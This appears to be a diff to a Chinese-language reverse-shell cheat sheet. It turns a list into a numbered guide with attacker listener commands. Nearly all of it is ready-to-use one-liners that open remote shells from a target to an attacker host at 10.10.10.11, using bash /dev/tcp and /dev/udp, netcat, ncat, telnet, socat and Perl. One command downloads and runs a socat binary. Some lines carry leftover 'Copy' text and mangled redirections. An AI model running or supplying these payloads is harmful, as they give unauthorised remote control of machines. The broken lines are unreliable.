@@ -2,7 +2,7 @@
 
 假设本机地址10.10.10.11，监听端口443。
 
-## Bash环境下反弹TCP协议shell
+## 1、Bash环境下反弹TCP协议shell
 
 首先在本地监听TCP协议443端口
 
@@ -26,7 +26,7 @@ exec /bin/sh 0</dev/tcp/10.10.10.11/443 1>&0 2>&0
 0<&196;exec 196<>/dev/tcp/10.10.10.11/443; sh <&196 >&196 2>&196
 ```
 
-## Bash环境下反弹UDP协议shell:
+## 2、Bash环境下反弹UDP协议shell:
 
 首先在本地监听UDP协议443端口
 ```bash
@@ -37,41 +37,80 @@ nc -u -lvp 443
 sh -i >& /dev/udp/10.10.10.11/443 0>&1
 ```
 
-## 使用Netcat反弹shell
+## 3、使用Netcat反弹shell
+首先在本地监听TCP协议443端口
 
-
+```bash
+nc -lvp 443
+```
+然后在靶机上执行如下命令：
+```bash
 nc -e /bin/sh 10.10.10.11 443
-Copy
+```
+```bash
 nc -e /bin/bash 10.10.10.11 443
-Copy
+```
+```bash
 nc -c bash 10.10.10.11 443
-Copy
+```
+```bash
 mknod backpipe p && nc 10.10.10.11 443 0<backpipe | /bin/bash 1>backpipe 
-Copy
+```
+```bash
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.11 443 >/tmp/f
-Copy
+```
+```bash
 rm -f /tmp/p; mknod /tmp/p p && nc 10.10.10.11 443 0/tmp/p 2>&1
-Copy
+```
+```bash
 rm f;mkfifo f;cat f|/bin/sh -i 2>&1|nc 10.10.10.11 443 > f
-Copy
+```
+```bash
 rm -f x; mknod x p && nc 10.10.10.11 443 0<x | /bin/bash 1>x
-Copy
+```
 
-## Ncat:
+## 4、使用Ncat反弹shell
+
+首先在本地监听TCP协议443端口
+
+```bash
+nc -lvp 443
+```
+然后在靶机上执行如下命令：
+```bash
 ncat 10.10.10.11 443 -e /bin/bash
-Copy
+```
+```bash
 ncat --udp 10.10.10.11 443 -e /bin/bash
-Copy
-Telnet:
+```
+
+## 5、Telnet:
+首先在本地监听TCP协议443端口
+
+```bash
+nc -lvp 443
+```
+然后在靶机上执行如下命令：
+```bash
 rm -f /tmp/p; mknod /tmp/p p && telnet 10.10.10.11 443 0/tmp/p 2>&1
-Copy
+```
+```bash
 telnet 10.10.10.11 443 | /bin/bash | telnet 10.10.10.11 444
-Copy
+```
+```bash
 rm f;mkfifo f;cat f|/bin/sh -i 2>&1|telnet 10.10.10.11 443 > f
-Copy
+```
+```bash
 rm -f x; mknod x p && telnet 10.10.10.11 443 0<x | /bin/bash 1>x
-Copy
-Socat:
+```
+
+## 6、Socat:
+首先在本地监听TCP协议443端口
+
+```bash
+socat file:`tty`,raw,echo=0 TCP-L:443
+```
+然后在靶机上执行如下命令：
 Victim:
 /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.10.11:443
 Copy
@@ -83,7 +122,13 @@ Copy
 Victim:
 wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.10.11:443
 Copy
-Perl:
+## 7、Perl:
+首先在本地监听TCP协议443端口
+
+```bash
+nc -lvp 443
+```
+然后在靶机上执行如下命令：
 Victim:
 perl -e 'use Socket;$i="10.10.10.11";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
 Copy
